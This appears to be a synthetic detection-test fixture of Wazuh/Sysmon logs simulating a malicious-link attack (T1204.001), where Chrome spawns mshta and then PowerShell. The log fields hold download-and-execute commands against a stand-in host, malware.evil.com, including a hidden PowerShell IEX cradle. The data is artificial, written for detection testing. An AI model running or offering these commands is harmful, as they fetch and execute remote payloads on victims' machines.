@@ -1,0 +1,230 @@
+{
+  "_metadata": {
+    "attack_id": "T1204.001",
+    "variation": "001",
+    "name": "User Execution - Malicious Link",
+    "description": "User clicks malicious link leading to payload execution",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Browser spawning suspicious process",
+      "sequence": 1,
+      "timestamp": "2026-01-30T06:15:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Browser Spawned Suspicious Child Process",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1204.001"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "User Execution: Malicious Link"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000032.400001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 06:15:00.000",
+              "processGuid": "{MALLINK-001-0001-000000000001}",
+              "processId": "73000",
+              "image": "C:\\Windows\\System32\\mshta.exe",
+              "commandLine": "mshta.exe http://malware.evil.com/payload.hta",
+              "currentDirectory": "C:\\Users\\victim\\",
+              "user": "CORP\\victim",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=MSHTA_HASH_1234567890ABCDEF1234567890ABCDEF12345",
+              "parentProcessGuid": "{MALLINK-001-0001-000000000000}",
+              "parentProcessId": "73000",
+              "parentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+              "parentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Malicious URL fetch",
+      "sequence": 2,
+      "timestamp": "2026-01-30T06:15:01.000Z",
+      "log": {
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 3: Suspicious HTTP Connection from mshta",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1204.001"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "User Execution: Malicious Link"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000032.400002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 06:15:01.000",
+              "processGuid": "{MALLINK-001-0001-000000000001}",
+              "processId": "73000",
+              "image": "C:\\Windows\\System32\\mshta.exe",
+              "user": "CORP\\victim",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "198.51.100.20",
+              "sourceHostname": "WS01.corp.local",
+              "sourcePort": "73100",
+              "destinationIsIpv6": "false",
+              "destinationIp": "185.220.101.100",
+              "destinationHostname": "malware.evil.com",
+              "destinationPort": "80",
+              "destinationPortName": "http"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Payload execution",
+      "sequence": 3,
+      "timestamp": "2026-01-30T06:15:05.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Malicious Link Payload Execution",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1204.001"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "User Execution: Malicious Link"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000032.400003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-30 06:15:05.000",
+              "processGuid": "{MALLINK-001-0001-000000000002}",
+              "processId": "73200",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://malware.evil.com/beacon.ps1')\"",
+              "currentDirectory": "C:\\Users\\victim\\",
+              "user": "CORP\\victim",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=PS_HASH_1234567890ABCDEF1234567890ABCDEF1234567890",
+              "parentProcessGuid": "{MALLINK-001-0001-000000000001}",
+              "parentProcessId": "73000",
+              "parentImage": "C:\\Windows\\System32\\mshta.exe",
+              "parentCommandLine": "mshta.exe http://malware.evil.com/payload.hta"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
